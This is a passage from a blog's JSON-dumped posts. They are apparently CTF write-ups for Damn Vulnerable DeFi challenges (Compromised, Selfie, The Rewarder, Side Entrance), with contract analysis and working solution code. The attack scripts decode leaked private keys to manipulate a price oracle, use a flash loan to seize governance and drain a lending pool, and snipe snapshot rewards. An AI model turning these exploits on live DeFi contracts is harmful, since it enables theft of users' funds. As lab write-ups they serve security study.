= &quot;&quot;;for (let i = 0; i &lt; chars.length; i++) &#123; chars[i] = &quot;0x&quot; + chars[i]; chars[i] = String.fromCharCode(parseInt(chars[i])); result += chars[i];&#125;result = atob(result);console.log(result);","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"Solidity","slug":"Utils/Solidity","permalink":"https://biyouqiuqiu.com/categories/Utils/Solidity/"}],"tags":[{"name":"PrivateKey","slug":"PrivateKey","permalink":"https://biyouqiuqiu.com/tags/PrivateKey/"},{"name":"ASCII","slug":"ASCII","permalink":"https://biyouqiuqiu.com/tags/ASCII/"}]},{"title":"Compromised","slug":"CTFS/damn defi/Compromised","date":"2023-07-13T03:37:10.000Z","updated":"2023-07-13T03:37:10.000Z","comments":true,"path":"2023/07/13/CTFS/damn defi/Compromised/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/13/CTFS/damn%20defi/Compromised/","excerpt":"","text":"1. issue While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet: 123456789HTTP/2 200 OKcontent-type: text/htmlcontent-language: envary: Accept-Encodingserver: cloudflare4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 354d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each. This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c. Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange. 目标：使用你手中的 0.1 ether 去掏空 交易所中的 所有ETH 题目链接 2. analysing2.1 understanding of me通读整个代码之后，理解了预言机及交易所的工作原理。我能想到的就是通过 postPrice修改货币的价格，使其售价低于我们手中的余额 0.1 ETH。但是，成为 TRUSTED_SOURCE_ROLE成为了难点。 1234// 修改 msg.sender 自己的货币价格 function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) &#123; _setPrice(msg.sender, symbol, newPrice);&#125; 还有一个修改售价的函数 setupInitialPrices，但是他的权限在 INITIALIZER_ROLE他手里，而拥有这个权力的人只有部署者有，就本题来说 拥有该权力的是 deployer 而我们作为 player我们必然没有权力去调用这个函数。到此我就开始陷入迷茫了。。。。。要么等 deployer 修改价格，要么等 卖家自己降价。 123456789101112131415function setupInitialPrices(address[] calldata sources, string[] calldata symbols, uint256[] calldata prices) external onlyRole(INITIALIZER_ROLE)&#123; // Only allow one (symbol, price) per source require(sources.length == symbols.length &amp;&amp; symbols.length == prices.length); // 确保每个地址对应一种货币 for (uint256 i = 0; i &lt; sources.length;) &#123; unchecked &#123; _setPrice(sources[i], symbols[i], prices[i]); // 给 sources[i] =&gt; symbols[i] 设置一个新的价格 prices[i] ++i; &#125; &#125; renounceRole(INITIALIZER_ROLE, msg.sender); // 执行完 初始化价格操作之后，将回收调用者的 INITIALIZER_ROLE 角色权力&#125; 2.2 search for help最后还是去网上搜了 题解 看完之后我只能说，牛的。。。。确实没注意审题，但是谁知道题目给的信息可以转为 EOA账户的私钥哇😅 转换链接 我将 转换出来的两个私钥通过 一些 手段 转成地址，发现和题目中的后两个地址一样。 也就是说我们可以冒充 &#39;0xe92401A4d3af5E446d93D11EEc806b1462b39D15&#39; &#39;0x81A5D6E50C214044bE44cA0CB057fe119097850c&#39; 。 于是就有了解题思路： 先将题目给的信息转成私钥 冒充卖家，通过 postPrice函数将自己货币价格改得很低 玩家player立即低价购买 冒充卖家，通过 postPrice函数将自己货币价格改为交易所现有ETH数目的价格 玩家player出售自己购买的货币 冒充卖家，通过 postPrice函数将自己货币价格改为 EXCHANGE_INITIAL_ETH_BALANCE 3. solving3.1 challenge.js12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ let code1 = &quot;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&quot;; let code2 = &quot;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&quot;; let chars1= code1.split(&quot; &quot;); let chars2 = code2.split(&quot; &quot;); let privateKey2 = &quot;&quot;; let privateKey3 = &quot;&quot;; for (let i = 0; i &lt; chars1.length; i++) &#123; chars1[i] = &quot;0x&quot; + chars1[i]; chars1[i] = String.fromCharCode(parseInt(chars1[i])); privateKey2 += chars1[i]; &#125; for (let i = 0; i &lt; chars2.length; i++) &#123; chars2[i] = &quot;0x&quot; + chars2[i]; chars2[i] = String.fromCharCode(parseInt(chars2[i])); privateKey3 += chars2[i]; &#125; privateKey2 = atob(privateKey2); privateKey3 = atob(privateKey3); let accountWallet2 = new ethers.Wallet(privateKey2, ethers.provider); let accountWallet3 = new ethers.Wallet(privateKey3, ethers.provider); // 修改oracle的msg.sender,分别将各自的货币价格设置为 1wei await oracle.connect(accountWallet2).postPrice(&#x27;DVNFT&#x27;, 1) await oracle.connect(accountWallet3).postPrice(&#x27;DVNFT&#x27;, 1) await exchange.connect(player).buyOne(&#123; value: 1, &#125;); // 交易所中现有的 ETH const newPrice = await ethers.provider.getBalance(exchange.address) // 修改oracle的msg.sender,分别将各自的货币价格设置为 newPrice await oracle.connect(accountWallet2).postPrice(&#x27;DVNFT&#x27;,newPrice) await oracle.connect(accountWallet3).postPrice(&#x27;DVNFT&#x27;,newPrice) /** * approve 操作为了成功执行 `token.transferFrom(msg.sender, address(this), id)` 允许 exchange.address可以调用 player的钱、 至于为什么是 `0`号代币，是因为在DamnValuableNFT中 &#x27;DVNFT&#x27; 是唯一一种 id 是根据 ` function safeMint(address to) public onlyRoles(MINTER_ROLE) returns (uint256 tokenId)`求的 */ await nftToken.connect(player).approve(exchange.address, 0) await exchange.connect(player).sellOne(0); // 将售价改回 EXCHANGE_INITIAL_ETH_BALANCE await oracle.connect(accountWallet2).postPrice(&#x27;DVNFT&#x27;,EXCHANGE_INITIAL_ETH_BALANCE) await oracle.connect(accountWallet3).postPrice(&#x27;DVNFT&#x27;,EXCHANGE_INITIAL_ETH_BALANCE) &#125;); 本题给我的启发：私钥很重要，一定要好好保管自己的私钥。还有做题的时候一定要好好看题再开始做题。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Selfie","slug":"CTFS/damn defi/Selfie","date":"2023-07-12T02:37:10.000Z","updated":"2023-07-12T02:37:10.000Z","comments":true,"path":"2023/07/12/CTFS/damn defi/Selfie/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/12/CTFS/damn%20defi/Selfie/","excerpt":"","text":"1. issue A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it. What could go wrong, right ? You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all. 目标：将 A new cool lending pool的钱全取出来。 题目链接 2. analysing2.1 SelfPool.solflashLoan 123456789101112131415161718192021222324function flashLoan( IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data) external nonReentrant returns (bool) &#123; // 保证 _token 为该合约的ERC20Snapshot地址 if (_token != address(token)) revert UnsupportedCurrency(); // 金库 向借贷者转账 token.transfer(address(_receiver), _amount); // _receiver 需要具备换贷功能，且返回值必须是 CALLBACK_SUCCESS // 此时 msg.sender = hacker if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) revert CallbackFailed(); if (!token.transferFrom(address(_receiver), address(this), _amount)) revert RepayFailed(); return true;&#125; 借贷函数，要求我们实现onFlashLoan函数，且按要求返回 CALLBACK_SUCCESS 然后再还清贷款，这里八分要涉及授权问题。 emergencyExit 12345678910// 紧急事件出口// 但是能操作这个函数的只有 该合约的管理者行function emergencyExit(address receiver) external onlyGovernance &#123; // 记录当前合约的余额 uint256 amount = token.balanceOf(address(this)); // 调用者将 amount 转给 receiver token.transfer(receiver, amount); emit FundsDrained(receiver, amount);&#125; 解题关键： 我们要通过 governance之手，将 借贷池的钱全部转移到我（player）的账户下。 重点就是如果借 governance之手，我们再看看 governance的合约。 SimpleGovernance 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../DamnValuableTokenSnapshot.sol&quot;;import &quot;./ISimpleGovernance.sol&quot;;// import &quot;hardhat/console.sol&quot;;/** * @title SimpleGovernance * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz) */contract SimpleGovernance is ISimpleGovernance &#123; uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days; DamnValuableTokenSnapshot private _governanceToken; // 治理代币 =&gt; 一种新型的代币拥有快照功能 uint256 private _actionCounter; // 动作计数器 mapping(uint256 =&gt; GovernanceAction) private _actions; // GovernanceAction 是 ISimpleGovernance 中的一个结构体 /** governanceToken 继承了 ERC20 拥有ERC20 协议的功能 */ constructor(address governanceToken) &#123; _governanceToken = DamnValuableTokenSnapshot(governanceToken); _actionCounter = 1; // 初始化动作行为次数 = 1 &#125; /** 排队行为 */ function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) &#123; // 判断是否有票 if (!_hasEnoughVotes(msg.sender)) revert NotEnoughVotes(msg.sender); // target 不能为当前合约 if (target == address(this)) revert InvalidTarget(); // data 需为 空，且 target.code.length 字节码不能为空，也就是说当前target需要正确部署到区块链上 if (data.length &gt; 0 &amp;&amp; target.code.length == 0) revert TargetMustHaveCode(); // 行为ID = 合约中的行为次数 actionId = _actionCounter; // 记录该行为的信息 _actions[actionId] = GovernanceAction(&#123; target: target, value: value, proposedAt: uint64(block.timestamp), executedAt: 0, data: data &#125;); // 行为次数加一 unchecked &#123; _actionCounter++; &#125; emit ActionQueued(actionId, msg.sender); &#125; /** 是否有足够的票 */ function _hasEnoughVotes(address who) private view returns (bool) &#123; /** 注意： 这里要注意的是，totalsupply 只受 铸币和销币的操作的影响 而balance既 受 铸币和销币的操作的影响 也受 转账操作的影响 所以在不执行burn操作的前提下，只要一铸币，在整体合约体系中 totalsupply是不变的 */ // 查看 who 在上次快照的时候的 balance uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who); // console.log(who,balance); // 查看 who 在上次快照的时候的 总供给量 的一半 uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2; // 如果 余额大于 一半供给量就是有票 return balance &gt; halfTotalSupply; &#125; /** 执行行为 */ function executeAction(uint256 actionId) external payable returns (bytes memory) &#123; // 是否满足执行条件 if(!_canBeExecuted(actionId)) revert CannotExecute(actionId); // 获取 该actionId 的 结构体 // `storage`我感觉要值得注意 GovernanceAction storage actionToExecute = _actions[actionId]; // 修改executedAt， 表示该actionId 进行了 执行行为 actionToExecute.executedAt = uint64(block.timestamp); emit ActionExecuted(actionId, msg.sender); // target 调用 actionToExecute.data 函数 (bool success, bytes memory returndata) = actionToExecute.target.call&#123;value: actionToExecute.value&#125;(actionToExecute.data); if (!success) &#123; if (returndata.length &gt; 0) &#123; assembly &#123; revert(add(0x20, returndata), mload(returndata)) &#125; &#125; else &#123; revert ActionFailed(actionId); &#125; &#125; return returndata; &#125; function getActionDelay() external pure returns (uint256) &#123; return ACTION_DELAY_IN_SECONDS; &#125; function getGovernanceToken() external view returns (address) &#123; return address(_governanceToken); &#125; function getAction(uint256 actionId) external view returns (GovernanceAction memory) &#123; return _actions[actionId]; &#125; function getActionCounter() external view returns (uint256) &#123; return _actionCounter; &#125; /** * @dev an action can only be executed if: // 只有在如下情况才可以能执行操作 * 1) it&#x27;s never been executed before and // 它以前从未被执行过 * 2) enough time has passed since it was first proposed // 自首次提出以来已经过去了足够的时间 */ function _canBeExecuted(uint256 actionId) private view returns (bool) &#123; GovernanceAction memory actionToExecute = _actions[actionId]; // 如果没排过队，就不能 进行 执行操作 ，直接退出 if (actionToExecute.proposedAt == 0) // early exit return false; uint64 timeDelta; // 时间三角洲？！ unchecked &#123; // timeDelta = 当前时间戳 - 排队时间戳 timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt; &#125; // actionToExecute.executedAt == 0(未被执行) 并且 timeDelta &gt;= 2 days return actionToExecute.executedAt == 0 &amp;&amp; timeDelta &gt;= ACTION_DELAY_IN_SECONDS; &#125;&#125; executeAction函数 (bool success, bytes memory returndata) = actionToExecute.target.call&#123;value: actionToExecute.value&#125;(actionToExecute.data)就是冒充的漏洞，SimpleGovernance调其他函数，就可以让它成为被盗函数的合约的 msg.sender就可以冒充。 要想成功执行executeAction函数，就得依次成功执行_hasEnoughVotes，queueAction，_canBeExecuted 所以重点就是 _hasEnoughVotes函数。 这个快照功能太复杂了，我知道 snapshots.ids.length始终 &#x3D; 1，我测试的结果是始终 &#x3D; 1 ，但是我不知道在哪设置的，index 除了第一次 是 0，之后一直都是 1。也就是说，里面存了一个索引为0的数据。看不懂 ….. _valueAt() 123456789101112 function _valueAt(uint256 snapshotId, Snapshots storage snapshots) private view returns (bool, uint256) &#123; require(snapshotId &gt; 0, &quot;ERC20Snapshot: id is 0&quot;); require(snapshotId &lt;= _getCurrentSnapshotId(), &quot;ERC20Snapshot: nonexistent id&quot;); uint256 index = snapshots.ids.findUpperBound(snapshotId); if (index == snapshots.ids.length) &#123; return (false, 0); &#125; else &#123; return (true, snapshots.values[index]); &#125;&#125; n天再看，，，，， 这里是继承。。。。。 ERC20中的铸币： 123456789101112function _mint(address account, uint256 amount) internal virtual &#123; require(account != address(0), &quot;ERC20: mint to the zero address&quot;); _beforeTokenTransfer(address(0), account, amount); _totalSupply += amount; _balances[account] += amount; emit Transfer(address(0), account, amount); _afterTokenTransfer(address(0), account, amount);&#125; 在三层继承中 ，DamnValuableTokenSnapshot &lt;= ERC20Snapshot &lt;= ERC20 在 DamnValuableTokenSnapshot 中，调用 mint ，_mint 中的 _beforeTokenTransfer 其实是先在 ERC20Snapshot 中找，如果找不到，再一层层往上找。所以使用 ERC20Snapshot 中的 _beforeTokenTransfer ，就会事先存入一个值，他的索引就是0. 3. solving3.1 SelfieHack.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./SimpleGovernance.sol&quot;;import &quot;./SelfiePool.sol&quot;;import &quot;hardhat/console.sol&quot;;/** 思路： 1. 部署 SimpleGovernance 合约，得到其地址 governance，构造器中的参数是js代码中的token.address 2. 部署 SelfiePool, 参数分别为 token.address 和 governance，得到合约 pool 3. 调用 SimpleGovernance 中 的`queueAction(address target, uint128 value, bytes calldata data)` 3.1 target = pool, value = 任意, data = abi.encodeWithSignature(&quot;emergencyExit(address)&quot;, player.address); 4. 调用 SimpleGovernance 中的 executeAction(uint256 actionId) external payable returns (bytes memory) 4.1 执行 queueAction 之后 actionId 会加一 ，所以要 进行-1 操作 */contract SelfieHack &#123; SimpleGovernance governance; SelfiePool pool; DamnValuableTokenSnapshot DVTSToken; constructor(address _governance, address _pool, address _token) &#123; governance = SimpleGovernance(_governance); pool = SelfiePool(_pool); DVTSToken = DamnValuableTokenSnapshot(_token); &#125; // 贷款，拿钱做自己想做的事情 function attack() external &#123; // 保存 `&quot;emergencyExit(address)&quot;, msg.sender`的 abi, 此时的 msg.sender = player.address bytes memory emergencyExitData = abi.encodeWithSignature(&quot;emergencyExit(address)&quot;, msg.sender); // 记录贷款数目（全贷） uint256 amount = DVTSToken.balanceOf(address(pool)); // 执行贷款操作 IERC3156FlashBorrower receiver = IERC3156FlashBorrower(address(this)); pool.flashLoan(receiver, address(DVTSToken), amount, emergencyExitData); &#125; function executeAction() external &#123; // 因为执行queueAction，SimpleGovernance 中的 行为次数会 加 1 ，所以要减 1 uint256 actionId = governance.getActionCounter() - 1; governance.executeAction(actionId); &#125; function onFlashLoan( address initiator, address token, uint256 amount, uint256 fee, bytes calldata data ) external returns (bytes32)&#123; // 得到钱之后马上拍照，记录当时我是有钱的 DVTSToken.snapshot(); // 执行 排队行为，为了接下来能够进行 执行行为 governance.queueAction(address(pool), 0, data); // 让 hacker 给 pool授权，不然 pool 不能执行 transferFrom函数，将hacker 的钱转回pool DVTSToken.approve(address(pool),DVTSToken.balanceOf(address(this))); // 按flashLoan要求返回 return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;); &#125;&#125; 3.2 selfie.challenge.js12345678it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const Hacker = await (await ethers.getContractFactory(&#x27;SelfieHack&#x27;, player)).deploy( governance.address, pool.address, token.address); await Hacker.attack(); await ethers.provider.send(&quot;evm_increaseTime&quot;, [2 * 24 * 60 * 60]); // 过两天 await Hacker.executeAction(); &#125;); 解题成功。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"The Rewarder","slug":"CTFS/damn defi/The Rewarder","date":"2023-07-11T00:37:10.000Z","updated":"2023-07-11T00:37:10.000Z","comments":true,"path":"2023/07/11/CTFS/damn defi/The Rewarder/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/11/CTFS/damn%20defi/The%20Rewarder/","excerpt":"","text":"1. issue There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself. By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens? 简单来说，就是 我手中没钱，要求我去存钱并获取最多的利息。当然这理论上是天方夜谭，所以题目给我们提供了一个闪电贷。 题目链接 2. analysing2.1 FlashLoanerPoolflashLoan函数 123456789101112131415161718192021222324252627282930313233function flashLoan(uint256 amount) external nonReentrant &#123; uint256 balanceBefore = liquidityToken.balanceOf(address(this)); // 贷款的数目不能大于借贷池的 balanceBefore if (amount &gt; balanceBefore) &#123; revert NotEnoughTokenBalance(); &#125; // 调用者只能是合约 if (!msg.sender.isContract()) &#123; revert CallerIsNotContract(); &#125; // 向msg.sender转账 liquidityToken.transfer(msg.sender, amount); /** 解读 `functionCall(address target, bytes memory data)` 1. 这里涉及了库函数的使用，库函数的调用者即为 functionCall 的第一个参数 2. 此时的调用者必须是一个合约地址，且该地址的余额必须大于等于0 3. 函数中还会执行target.call&#123;value: value&#125;(data) 3.1. 使用 target 调用 data字节码表示的函数 3.2. 并且发送 value的金额，此时的value=0 sum: 在底层使用 target 调用 &quot;data函数&quot; */ // receiveFlashLoan 函数未定义，有操作空间 msg.sender.functionCall(abi.encodeWithSignature(&quot;receiveFlashLoan(uint256)&quot;, amount)); // 确保还钱之后，借贷池的余额大于未借贷之前的余额 if (liquidityToken.balanceOf(address(this)) &lt; balanceBefore) &#123; revert FlashLoanNotPaidBack(); &#125; &#125; 一个借贷功能，但是要求借贷人实现 receiveFlashLoan(uint256)函数才能借贷。 2.2 TheRewarderPool对目前的我来说，分析起来真要命（具体的细节还是那个快照）。。。。 先看构造函数，构造函数中的_recordSnapshot()就有大学问。 1234567891011121314151617181920constructor(address _token) &#123; // Assuming all tokens have 18 decimals liquidityToken = _token; // 金库地址 accountingToken = new AccountingToken(); // DVT token rewardToken = new RewardToken(); // 奖励代币 RWT /** 部署合约之后，拍一次快照， 此时的 lastSnapshotIdForRewards = 1，lastRecordedSnapshotTimestamp = 部署合约的时间 当我们的 msg.sender 第一次调用deposit时，lastRewardTimestamps[msg.sender] = 0 也就是，函数 _hasRetrievedReward 的判断条件 lastRewardTimestamps[account] &gt;= lastRecordedSnapshotTimestamp : 0 &gt;= uint64(block.timestamp) ？ lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION ：0 &lt;= uint64(block.timestamp) + 5 days 所以只要是第一次进行操作的用户，结果返回的始终是false */ _recordSnapshot();&#125; 看完这个函数之后，给我的想法是，这不就是给新用户的福利吗，只要是新用户（msg.sender第一次调用此合约），不管怎么样，即使是我刚刚部署完合约就立马存钱就直接可以获得reward。 deposit函数 12345678910111213141516171819202122function deposit(uint256 amount) external &#123; // 存款不能为0 if (amount == 0) &#123; revert InvalidDepositAmount(); &#125; // 为 msg.sender 铸币 accountingToken.mint(msg.sender, amount); // 执行分配奖励机制 distributeRewards(); // liquidityToken 负责 从 msg.sender 向 address(this) 转移 amount 的ETH // 此时的 msg.sender 是 Account SafeTransferLib.safeTransferFrom( liquidityToken, msg.sender, address(this), amount ); &#125; 代码还行的，重点就是 distributeRewards(). distributeRewards()函数 123456789101112131415161718192021222324252627282930// 分配奖励函数function distributeRewards() public returns (uint256 rewards) &#123; // 是否是新的快照时期 if (isNewRewardsRound()) &#123; // 如果时新的回合，就更新当前快照 _recordSnapshot(); &#125; // 查询最新快照 的 totalSupply // 如果是第一回合，则返回铸币数目 uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards); // 在当前快照下，msg.sneder 的 balance uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards); if (amountDeposited &gt; 0 &amp;&amp; totalDeposits &gt; 0) &#123; // rewards = amountDeposited * REWARDS / totalDeposits rewards = amountDeposited.mulDiv(REWARDS, totalDeposits); // rewards &gt; 0; _hasRetrievedReward:是否检索到新的奖励 if (rewards &gt; 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) &#123; // 为 msg.sender 铸奖励币 rewardToken.mint(msg.sender, rewards); // 记录 msg.sender 最新获利的时间 lastRewardTimestamps[msg.sender] = uint64(block.timestamp); &#125; &#125;&#125; 简单来说，就是账户没钱就不做什么操作，如果有钱，且rewards 和存钱时间大于 5days 就可以获得奖励池的RWT奖励，并更新该账户的获取时间。 _hasRetrievedReward函数 123456function _hasRetrievedReward(address account) private view returns (bool) &#123; return ( lastRewardTimestamps[account] &gt;= lastRecordedSnapshotTimestamp &amp;&amp; lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION );&#125; 我有个疑惑，即使不是新用户，那么我只要将合约部署之后，过了五天之后，我就可以一直往里面获取奖励？ 因为 lastRecordedSnapshotTimestamp 只有在初始化的时候被赋值，只要我不赋值（即不再部署新的该合约，是不是就可以五天之后一直调用 奖励函数呢？ 想明白了： 看错代码了，lastRecordedSnapshotTimestamp 只在初始化中会执行一次，其他时候都在distributeRewards函数中，也就是说每次执行 奖励函数，如果成功获奖，那么久更新 lastRecordedSnapshotTimestamp。 到这里，做题思路就出来了，案例来说对于我们新用户，不用等 5days就可以取钱了的，所以只要向 借贷池中借 最多的钱，来执行我们的存钱操作就可以了。当然，题目还挖了个坑，，，， 1234expect( await rewarderPool.roundNumber()).to.be.eq(3); 要到第三回合才可以成功。要是有耐心的人的话，可以等 5天，但是我没耐心且在本地，就可以使用 ethers的工具，来篡改EVM的时间。 综上所述，我们的思路是： 部署 奖励池合约 等待 5 天，从 中获取 DVT 的闪贷FlashLoanerPool， 存入RewarderPool（执行deposit函数也会执行distributeRewards函数）， 提取 DVT 发送RewardToken给攻击者 偿还贷款。 3. solving3.1 RewardHack123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./FlashLoanerPool.sol&quot;;import &quot;./TheRewarderPool.sol&quot;;import &quot;../DamnValuableToken.sol&quot;;import &#123; RewardToken &#125; from &quot;./RewardToken.sol&quot;;import &quot;hardhat/console.sol&quot;;contract RewardHack &#123; DamnValuableToken damnValuableToken; FlashLoanerPool flashLoanpool; TheRewarderPool rewarderPool; RewardToken rewardToken; address player; constructor(address _dvtAddr, address _flashpoolAddr, address _rewarderpollAddr, address _rwtAddr) &#123; damnValuableToken = DamnValuableToken(_dvtAddr); flashLoanpool = FlashLoanerPool(_flashpoolAddr); // 用来调用 flashLoan rewarderPool = TheRewarderPool(_rewarderpollAddr); // 用来调用 存钱取钱 rewardToken = RewardToken(_rwtAddr); player = msg.sender; // 记录当前player的地址 &#125; // 让我们的 hacker 成为借贷着，虽然题目要求操作的是 player的余额，但是player 和 hacker 是自己人嘛 // receiveFlashLoan 还贷是在借贷之后的，所以可以假设我们现在有钱，我们先把自己要做的事情做完再还款 function receiveFlashLoan(uint256 amount) external &#123; /** 为了让 RewardHack 给 rewardPool授权 `allowance[msg.sender][spender] = amount;` safeTransferFrom 函数的声明有解释 The `from` account must have at least `amount` approved for */ damnValuableToken.approve(address(rewarderPool), amount); // 先执行存钱操作，里面执行了获利函数，此时 balance(RewardHack) = amount + rewards // 此时 amount 在 TheRewarderPool ，而 rewards 在 RewardHack 中 rewarderPool.deposit(amount); // 把存的钱（amount）取出来, amount 在 RewardHack 中 rewarderPool.withdraw(amount); // 要通过 TheRewarderPool账户 将 rewards 转给 RewardHack rewardToken.transfer(player, rewardToken.balanceOf(address(this))); // 还贷 damnValuableToken.transfer(address(flashLoanpool), amount); // 将 TheRewarderPool 中的rewards全部转给我（player） damnValuableToken.transfer(player, rewardToken.balanceOf(address(this))); &#125; function attack(uint256 amount) external &#123; /** 执行借贷操作： 对 RewardHack 函数来说，msg.sender 是我，对 FlashLoanerPool 来说msg.sender 是 RewardHack； 在执行 `liquidityToken.transfer(msg.sender, amount)`时， 金库 damnValuableToken 是给 RewardHack 转账 */ flashLoanpool.flashLoan(amount); &#125;&#125; 3.2 challenge.js12345678it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const attacker = await(await ethers.getContractFactory(&#x27;RewardHack&#x27;, player)).deploy( liquidityToken.address, flashLoanPool.address, rewarderPool.address, rewardToken.address ); await ethers.provider.send(&quot;evm_increaseTime&quot;, [5 * 24 * 60 * 60]); await attacker.attack(TOKENS_IN_LENDER_POOL);&#125;); 3.3 above all 这个challenge 的 msg.sender真的很绝，至少这是我目前遇到的最绕的一个。 理解好 msg.sender ，其实也还行。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Side Entrance","slug":"CTFS/damn defi/Side Entrance","date":"2023-07-10T09:37:10.000Z","updated":"2023-07-10T09:37:10.000Z","comments":true,"path":"2023/07/10/CTFS/damn defi/Side Entrance/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/10/CTFS/damn%20defi/Side%20Entrance/","excerpt":"","text":"1. issue A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time. It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system. Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool. 我们的目标就是，凭借手里的1 ether 将 pool的钱全部取出来。 题目链接 2. analysing观察合约可知，里面有三个函数，分别是 deposit(),withdraw(),falshLoan()。 我的第一反应是使用自毁函数，但是，分析才发现，自毁操作只会毁掉自己所在合约，不会对其他合约产生影响。 所以只能将目光看到，取款操作。 withdraw()： 12345678function withdraw() external &#123; uint256 amount = balances[msg.sender]; delete balances[msg.sender]; emit Withdraw(msg.sender, amount); SafeTransferLib.safeTransferETH(msg.sender, amount);&#125; 分析不难看出，我们只能取 mapping balance中所记录的金额大小。那我们看到存款操作。 deposit(): 123456function deposit() external payable &#123; unchecked &#123; balances[msg.sender] += msg.value; &#125; emit Deposit(msg.sender, msg.value);&#125; 